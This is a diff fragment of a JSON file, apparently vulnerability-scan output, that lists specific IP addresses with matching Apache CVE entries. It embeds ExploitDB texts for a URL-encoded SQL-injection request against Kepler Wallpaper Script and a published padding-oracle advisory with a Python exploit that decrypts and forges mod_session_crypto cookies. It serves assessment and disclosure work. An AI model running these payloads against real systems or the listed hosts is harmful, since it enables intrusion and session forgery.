+                "code": "# Exploit Title: Kepler Wallpaper Script 1.1 - SQL Injection\r\n# Dork: N/A\r\n# Date: 2019-01-19\r\n# Exploit Author: Ihsan Sencan\r\n# Vendor Homepage: https://keplerwallpapers.online/\r\n# Software Link: https://codeclerks.com/PHP/1559/Kepler-Wallpaper-Script\r\n# Version: 1.1\r\n# Category: Webapps\r\n# Tested on: WiN7_x64/KaLiLinuX_x64\r\n# CVE: N/A\r\n\r\n# POC: \r\n# 1)\r\n# http://localhost/[PATH]//[PATH]/category/xxx[SQL]\r\n# \r\n\r\nGET /[PATH]/category/xxx%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2d%2d%20%2d HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate, br\r\nCookie: PHPSESSID=6963a7f072dbf72fb4cb420c9f5ad80a; ResolutionWidthAuto=1366; ResolutionHeightAuto=768; FilterType=Auto\r\nDNT: 1\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nHTTP/1.1 200 OK\r\nDate: Sat, 19 Jan 2019 09:01:06 GMT\r\nServer: Apache\r\nX-Powered-By: PHP/5.6.37\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\nAccess-Control-Allow-Origin: *\r\nStrict-Transport-Security: max-age=31536000\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8",
+                "description": "Kepler Wallpaper Script 1.1 - SQL Injection",
+                "author": "Ihsan Sencan",
+                "_id": 46207,
+                "source": "ExploitDB",
+                "platform": "php",
+                "date": "2019-01-21T00:00:00+00:00",
+                "cve": [],
+                "type": "webapps",
+                "port": 80
+            }
+        ]
+    },
+    "152.46.3.104": {},
+    "152.46.3.119": {
+        "CVE-2010-2068": [
+            {
+                "source": "CVE",
+                "_id": "2010-2791",
+                "description": "mod_proxy in httpd in Apache HTTP Server 2.2.9, when running on Unix, does not close the backend connection if a timeout occurs when reading a response from a persistent connection, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.  NOTE: this is the same issue as CVE-2010-2068, but for a different OS and set of affected versions.",
+                "osvdb": [],
+                "bid": [
+                    42102
+                ],
+                "cve": [
+                    "CVE-2010-2791"
+                ],
+                "msb": []
+            },
+            {
+                "source": "CVE",
+                "_id": "2010-2068",
+                "description": "mod_proxy_http.c in mod_proxy_http in the Apache HTTP Server 2.2.9 through 2.2.15, 2.3.4-alpha, and 2.3.5-alpha on Windows, NetWare, and OS/2, in certain configurations involving proxy worker pools, does not properly detect timeouts, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.",
+                "osvdb": [],
+                "bid": [
+                    40827
+                ],
+                "cve": [
+                    "CVE-2010-2068"
+                ],
+                "msb": []
+            }
+        ]
+    },
+    "152.46.3.133": {
+        "CVE-2010-2068": [
+            {
+                "source": "CVE",
+                "_id": "2010-2791",
+                "description": "mod_proxy in httpd in Apache HTTP Server 2.2.9, when running on Unix, does not close the backend connection if a timeout occurs when reading a response from a persistent connection, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.  NOTE: this is the same issue as CVE-2010-2068, but for a different OS and set of affected versions.",
+                "osvdb": [],
+                "bid": [
+                    42102
+                ],
+                "cve": [
+                    "CVE-2010-2791"
+                ],
+                "msb": []
+            },
+            {
+                "source": "CVE",
+                "_id": "2010-2068",
+                "description": "mod_proxy_http.c in mod_proxy_http in the Apache HTTP Server 2.2.9 through 2.2.15, 2.3.4-alpha, and 2.3.5-alpha on Windows, NetWare, and OS/2, in certain configurations involving proxy worker pools, does not properly detect timeouts, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.",
+                "osvdb": [],
+                "bid": [
+                    40827
+                ],
+                "cve": [
+                    "CVE-2010-2068"
+                ],
+                "msb": []
+            }
+        ]
+    },
+    "152.46.3.151": {
+        "CVE-2010-2068": [
+            {
+                "source": "CVE",
+                "_id": "2010-2791",
+                "description": "mod_proxy in httpd in Apache HTTP Server 2.2.9, when running on Unix, does not close the backend connection if a timeout occurs when reading a response from a persistent connection, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.  NOTE: this is the same issue as CVE-2010-2068, but for a different OS and set of affected versions.",
+                "osvdb": [],
+                "bid": [
+                    42102
+                ],
+                "cve": [
+                    "CVE-2010-2791"
+                ],
+                "msb": []
+            },
+            {
+                "source": "CVE",
+                "_id": "2010-2068",
+                "description": "mod_proxy_http.c in mod_proxy_http in the Apache HTTP Server 2.2.9 through 2.2.15, 2.3.4-alpha, and 2.3.5-alpha on Windows, NetWare, and OS/2, in certain configurations involving proxy worker pools, does not properly detect timeouts, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.",
+                "osvdb": [],
+                "bid": [
+                    40827
+                ],
+                "cve": [
+                    "CVE-2010-2068"
+                ],
+                "msb": []
+            }
+        ]
+    },
+    "152.46.3.156": {},
+    "152.46.3.220": {
+        "CVE-2014-0117": [
+            {
+                "source": "CVE",
+                "_id": "2014-0117",
+                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
+                "osvdb": [],
+                "bid": [],
+                "cve": [
+                    "CVE-2014-0117"
+                ],
+                "msb": []
+            }
+        ],
+        "CVE-2014-0118": [
+            {
+                "source": "CVE",
+                "_id": "2014-0118",
+                "description": "The deflate_in_filter function in mod_deflate.c in the mod_deflate module in the Apache HTTP Server before 2.4.10, when request body decompression is enabled, allows remote attackers to cause a denial of service (resource consumption) via crafted request data that decompresses to a much larger size.",
+                "osvdb": [],
+                "bid": [
+                    68745
+                ],
+                "cve": [
+                    "CVE-2014-0118"
+                ],
+                "msb": []
+            }
+        ],
+        "CVE-2016-0736": [
+            {
+                "source": "CVE",
+                "_id": "2016-0736",
+                "description": "In Apache HTTP Server versions 2.4.0 to 2.4.23, mod_session_crypto was encrypting its data/cookie using the configured ciphers with possibly either CBC or ECB modes of operation (AES256-CBC by default), hence no selectable or builtin authenticated encryption. This made it vulnerable to padding oracle attacks, particularly with CBC.",
+                "osvdb": [],
+                "bid": [
+                    95078
+                ],
+                "cve": [
+                    "CVE-2016-0736"
+                ],
+                "msb": []
+            },
+            {
+                "code": "'''\r\nAdvisory: Padding Oracle in Apache mod_session_crypto\r\n\r\nDuring a penetration test, RedTeam Pentesting discovered a Padding\r\nOracle vulnerability in mod_session_crypto of the Apache web server.\r\nThis vulnerability can be exploited to decrypt the session data and even\r\nencrypt attacker-specified data.\r\n\r\n\r\nDetails\r\n=======\r\n\r\nProduct: Apache HTTP Server mod_session_crypto\r\nAffected Versions: 2.3 to 2.5\r\nFixed Versions: 2.4.25\r\nVulnerability Type: Padding Oracle\r\nSecurity Risk: high\r\nVendor URL: https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html\r\nVendor Status: fixed version released\r\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt\r\nAdvisory Status: published\r\nCVE: CVE-2016-0736\r\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736\r\n\r\n\r\nIntroduction\r\n============\r\n\r\nThe module mod_session_crypto of the Apache HTTP Server can be used in\r\nconjunction with the modules mod_session and mod_session_cookie to store\r\nsession data in an encrypted cookie within the users' browsers. This\r\navoids server-side session state so that incoming HTTP requests can be\r\neasily distributed amongst a number of application web servers which do\r\nnot need to share session state.\r\n\r\n\r\nMore Details\r\n============\r\n\r\nThe module mod_session_crypto uses symmetric cryptography to encrypt and\r\ndecrypt session data and uses mod_session to store the encrypted data in\r\na cookie (usually called \"session\") within the user's browser. The\r\ndecrypted session is then made available to the application in an\r\nenvironment variable (in case of a CGI script) or in a custom HTTP\r\nrequest header. The application can add a custom HTTP response header\r\n(usually \"X-Replace-Session\") which instructs the HTTP server to replace\r\nthe session's content with the value of the header. Detailed\r\ninstructions to set up mod_session and mod_session_crypto can be found\r\nin the documentation:\r\nhttps://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples\r\n\r\nThe module mod_session_crypto is configured to use either 3DES or AES\r\nwith various key sizes, defaulting to AES256. Encryption is handled by\r\nthe function \"encrypt_string\":\r\n\r\nmodules/session/mod_session_crypto.c\r\n------------------------------------------------------------------------\r\n/**\r\n * Encrypt the string given as per the current config.\r\n *\r\n * Returns APR_SUCCESS if successful.\r\n */\r\nstatic apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,\r\n        session_crypto_dir_conf *dconf, const char *in, char **out)\r\n{\r\n[...]\r\n    apr_crypto_key_t *key = NULL;\r\n[...]\r\n    const unsigned char *iv = NULL;\r\n[...]\r\n\r\n    /* use a uuid as a salt value, and prepend it to our result */\r\n    apr_uuid_get(&salt);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_passphrase(&key, &ivSize, passphrase,\r\n            strlen(passphrase),\r\n            (unsigned char *) (&salt), sizeof(apr_uuid_t),\r\n            *cipher, APR_MODE_CBC, 1, 4096, f, r->pool);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);\r\n[...]\r\n    res = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,\r\n            strlen(in), block);\r\n[...]\r\n    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);\r\n[...]\r\n\r\n    /* prepend the salt and the iv to the result */\r\n    combined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));\r\n    memcpy(combined, &salt, sizeof(apr_uuid_t));\r\n    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);\r\n    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);\r\n\r\n    /* base64 encode the result */\r\n    base64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +\r\n                    sizeof(apr_uuid_t) + 1)\r\n            * sizeof(char));\r\n[...]\r\n    return res;\r\n}\r\n------------------------------------------------------------------------\r\n\r\nThe source code shows that an encryption key is derived from the\r\nconfigured password and a randomly chosen salt by calling the function\r\n\"apr_crypto_passphrase\". This function internally uses PBKDF2 to derive\r\nthe key. The data is then encrypted and the salt and IV prepended to the\r\nencrypted data. Before returning to the caller, the result is encoded as\r\nbase64.\r\n\r\nThis procedure does not guarantee integrity of the ciphertext, so the\r\nApache module is unable to detect whether a session sent back to the\r\nserver has been tampered with. Depending on the application this often\r\nmeans that attackers are able to exploit a Padding Oracle vulnerability.\r\nThis allows decrypting the session and encrypting arbitrary data chosen\r\nby the attacker.\r\n\r\n\r\nProof of Concept\r\n================\r\n\r\nThe vulnerability can be reproduced as follows. First, the modules\r\nmod_session, mod_session_crypto and mod_session_cookie are enabled and\r\nconfigured:\r\n\r\n------------------------------------------------------------------------\r\nSession On\r\nSessionEnv On\r\nSessionCookieName session path=/\r\nSessionHeader X-Replace-Session\r\nSessionCryptoPassphrase RedTeam\r\n------------------------------------------------------------------------\r\n\r\nIn addition, CGI scripts are enabled for a folder and the following CGI\r\nscript is saved as \"status.rb\" and is made available to clients:\r\n\r\n------------------------------------------------------------------------\r\n#!/usr/bin/env ruby\r\n\r\nrequire 'cgi'\r\n\r\ncgi = CGI.new\r\ndata = CGI.parse(ENV['HTTP_SESSION'])\r\n\r\nif data.has_key? 'username'\r\n        puts\r\n        puts \"your username is %s\" % data['username']\r\n        exit\r\nend\r\n\r\nputs \"X-Replace-Session: username=guest&timestamp=\" + Time.now.strftime(\"%s\")\r\nputs\r\nputs \"not logged in\"\r\n------------------------------------------------------------------------\r\n\r\nOnce the CGI script is correctly set up, the command-line HTTP client curl\r\ncan be used to access it:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb\r\nHTTP/1.1 200 OK\r\nDate: Tue, 19 Jan 2016 13:23:19 GMT\r\nServer: Apache/2.4.10 (Ubuntu)\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nCache-Control: no-cache\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-ruby\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThe example shows that a new encrypted cookie with the name \"session\" is\r\nreturned, and the response body contains the text \"not logged in\".\r\nCalling the script again with the cookie just returned reveals that the\r\nusername in the session is set to \"guest\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is guest\r\n------------------------------------------------------------------------\r\n\r\nSending a modified cookie ending in \"u=\" instead of \"U=\" will invalidate\r\nthe padding at the end of the ciphertext, so the session cannot be\r\ndecrypted correctly and is therefore not passed to the CGI script, which\r\nreturns the text \"not logged in\" again:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThis verifies the existence of the Padding Oracle vulnerability. The\r\nPython library[1] python-paddingoracle was then used to implement\r\ndecrypting the session by exploiting the Padding Oracle vulnerability.\r\n\r\nexploit.py\r\n------------------------------------------------------------------------\r\n'''\r\n\r\nfrom paddingoracle import BadPaddingException, PaddingOracle\r\nfrom base64 import b64encode, b64decode\r\nimport requests\r\n\r\nclass PadBuster(PaddingOracle):\r\n    def __init__(self, valid_cookie, **kwargs):\r\n        super(PadBuster, self).__init__(**kwargs)\r\n        self.wait = kwargs.get('wait', 2.0)\r\n        self.valid_cookie = valid_cookie\r\n\r\n    def oracle(self, data, **kwargs):\r\n        v = b64encode(self.valid_cookie+data)\r\n\r\n        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',\r\n                cookies=dict(session=v), stream=False, timeout=5, verify=False)\r\n\r\n        if 'username' in response.content:\r\n            logging.debug('No padding exception raised on %r', v)\r\n            return\r\n\r\n        raise BadPaddingException\r\n\r\nif __name__ == '__main__':\r\n    import logging\r\n    import sys\r\n\r\n    if not sys.argv[2:]:\r\n        print 'Usage: [encrypt|decrypt] <session value> <plaintext>'\r\n        sys.exit(1)\r\n\r\n    logging.basicConfig(level=logging.WARN)\r\n    mode = sys.argv[1]\r\n    session = b64decode(sys.argv[2])\r\n    padbuster = PadBuster(session)\r\n\r\n    if mode == \"decrypt\":\r\n        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])\r\n        print('Decrypted session:\\n%r' % cookie)\r\n    elif mode == \"encrypt\":\r\n        key = session[0:16]\r\n        plaintext = sys.argv[3]\r\n\r\n        s = padbuster.encrypt(plaintext, block_size=16)\r\n\r\n        data = b64encode(key+s[0:len(s)-16])\r\n        print('Encrypted session:\\n%s' % data)\r\n    else:\r\n        print \"invalid mode\"\r\n        sys.exit(1)\r\n\r\n'''\r\n------------------------------------------------------------------------\r\n\r\nThis Python script can then be used to decrypt the session:\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=\r\nDecrypted session:\r\nb'username=guest&timestamp=1453282205\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r'\r\n\r\nreal    6m43.088s\r\nuser    0m15.464s\r\nsys 0m0.976s\r\n------------------------------------------------------------------------\r\n\r\nIn this sample application, the username and a timestamp are included in\r\nthe session data. The Python script can also be used to encrypt a new\r\nsession containing the username \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\\\r\nRU= username=admin\r\n\r\nEncrypted session:\r\nsxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY\r\n\r\nreal3m38.002s\r\nusers0m8.536s\r\nsys0m0.512s\r\n\r\n------------------------------------------------------------------------\r\n\r\nSending this newly encrypted session to the server shows that the\r\nusername is now \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\\\r\nzmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is admin\r\n------------------------------------------------------------------------\r\n\r\n\r\nWorkaround\r\n==========\r\n\r\nUse a different means to store the session, e.g. in a database by using\r\nmod_session_dbd.\r\n\r\n\r\nFix\r\n===\r\n\r\nUpdate to Apache HTTP version 2.4.25 (see [2]).\r\n\r\n\r\nSecurity Risk\r\n=============\r\n\r\nApplications which use mod_session_crypto usually store sensitive values\r\nin the session and rely on an attacker's inability to decrypt or modify\r\nthe session. Successful exploitation of the Padding Oracle vulnerability\r\nsubverts this mechanism and allows to construct sessions with arbitrary\r\nattacker-specified content. Depending on the application this may\r\ncompletely subvert the application's security. Therefore, this\r\nvulnerability poses a high risk.\r\n\r\n\r\nTimeline\r\n========\r\n\r\n2016-01-11 Vulnerability identified\r\n2016-01-12 Customer approved disclosure to vendor\r\n2016-01-12 CVE number requested\r\n2016-01-20 Vendor notified\r\n2016-01-22 Vendor confirmed the vulnerability\r\n2016-02-03 Vendor provided patch\r\n2016-02-04 Apache Security Team assigned CVE number\r\n2016-03-03 Requested status update from vendor, no response\r\n2016-05-02 Requested status update from vendor, no response\r\n2016-07-14 Requested status update and roadmap from vendor\r\n2016-07-21 Vendor confirms working on a new released and inquired whether the\r\n           patch fixes the vulnerability\r\n2016-07-22 RedTeam confirms\r\n2016-08-24 Requested status update from vendor\r\n2016-08-29 Vendor states that there is no concrete timeline\r\n2016-12-05 Vendor announces a release\r\n2016-12-20 Vendor released fixed version\r\n2016-12-23 Advisory released\r\n\r\n\r\nReferences\r\n==========\r\n\r\n[1] https://github.com/mwielgoszewski/python-paddingoracle\r\n[2] http://httpd.apache.org/security/vulnerabilities_24.html\r\n\r\n\r\nRedTeam Pentesting GmbH\r\n=======================\r\n\r\nRedTeam Pentesting offers individual penetration tests performed by a\r\nteam of specialised IT-security experts. Hereby, security weaknesses in\r\ncompany networks or products are uncovered and can be fixed immediately.\r\n\r\nAs there are only few experts in this field, RedTeam Pentesting wants to\r\nshare its knowledge and enhance the public knowledge with research in\r\nsecurity-related areas. The results are made available as public\r\nsecurity advisories.\r\n\r\nMore information about RedTeam Pentesting can be found at:\r\nhttps://www.redteam-pentesting.de/\r\n'''",
+                "description": "Apache mod_session_crypto - Padding Oracle",
+                "author": "RedTeam Pentesting GmbH",
+                "_id": 40961,
+                "source": "ExploitDB",
+                "platform": "multiple",
+                "date": "2016-12-23T00:00:00+00:00",
+                "cve": [
+                    "CVE-2016-0736"
+                ],
+                "type": "webapps",
+                "port": 0
+            }
+        ],
+        "CVE-2015-3185": [
+            {
+                "source": "CVE",
+                "_id": "2015-3185",
+                "description": "The ap_some_auth_required function in server/request.c in the Apache HTTP Server 2.4.x before 2.4.14 does not consider that a Require directive may be associated with an authorization setting rather than an authentication setting, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by leveraging the presence of a module that relies on the 2.2 API behavior.",
+                "osvdb": [],
+                "bid": [
+                    75965
+                ],
+                "cve": [
+                    "CVE-2015-3185"
+                ],
+                "msb": []
+            }
+        ],
+        "CVE-2015-3184": [
+            {
+                "source": "CVE",
+                "_id": "2015-3184",
+                "description": "mod_authz_svn in Apache Subversion 1.7.x before 1.7.21 and 1.8.x before 1.8.14, when using Apache httpd 2.4.x, does not properly restrict anonymous access, which allows remote anonymous users to read hidden files via the path name.",
+                "osvdb": [],
+                "bid": [
+                    76274
+                ],
+                "cve": [
+                    "CVE-2015-3184"
+                ],
+                "msb": []
+            }
+        ],
+        "CVE-2018-1312": [
+            {
+                "source": "CVE",
+                "_id": "2018-1312",
+                "description": "In Apache httpd 2.2.0 to 2.4.29, when generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.",
+                "osvdb": [],
+                "bid": [
+                    103524
+                ],
+                "cve": [
+                    "CVE-2018-1312"
+                ],
+                "msb": []
+            }
+        ],
+        "CVE-2016-4975": [
+            {
+                "source": "CVE",
+                "_id": "2016-4975",
+                "description": "Possible CRLF injection allowing HTTP response splitting attacks for sites which use mod_userdir. This issue was mitigated by changes made in 2.4.25 and 2.2.32 which prohibit CR or LF injection into the \"Location\" or other outbound header key or value. Fixed in Apache HTTP Server 2.4.25 (Affected 2.4.1-2.4.23). Fixed in Apache HTTP Server 2.2.32 (Affected 2.2.0-2.2.31).",
+                "osvdb": [],
+                "bid": [
+                    105093
+                ],
+                "cve": [
+                    "CVE-2016-4975"
+                ],
+                "msb": []
+            }
+        ],
+        "CVE-2016-8612": [
+            {
+                "source": "CVE",
+                "_id": "2016-8612",
+                "description": "Apache HTTP Server mod_cluster before version httpd 2.4.23 is vulnerable to an Improper Input Validation in the protocol parsing logic in the load balancer resulting in a Segmentation Fault in the serving httpd process.",
+                "osvdb": [],
+                "bid": [
+                    94939
+                ],
+                "cve": [
+                    "CVE-2016-8612"
+                ],
+                "msb": []
+            },
+            {
+                "source": "CVE",
+                "_id": "2018-8612",
+                "description": "A Denial Of Service vulnerability exists when Connected User Experiences and Telemetry Service fails to validate certain function values, aka \"Connected User Experiences and Telemetry Service Denial of Service Vulnerability.\" This affects Windows Server 2016, Windows 10, Windows Server 2019, Windows 10 Servers.",
+                "osvdb": [],
+                "bid": [
+                    106087
+                ],
+                "cve": [
+                    "CVE-2018-8612"
+                ],
+                "msb": []
+            }
+        ]
+    },
+    "152.46.3.241": {
+        "CVE-2014-0117": [
+            {
+                "source": "CVE",
+                "_id": "2014-0117",
+                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
+                "osvdb": [],
+                "bid": [],
+                "cve": [
+                    "CVE-2014-0117"
+                ],
+                "msb": []
+            }
+        ]
+    },
+    "152.46.3.246": {
+        "CVE-2014-0117": [
+            {
+                "source": "CVE",
+                "_id": "2014-0117",
+                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
+                "osvdb": [],
+                "bid": [],
+                "cve": [
+                    "CVE-2014-0117"
+                ],
+                "msb": []
+            }
+        ]
+    }
+}
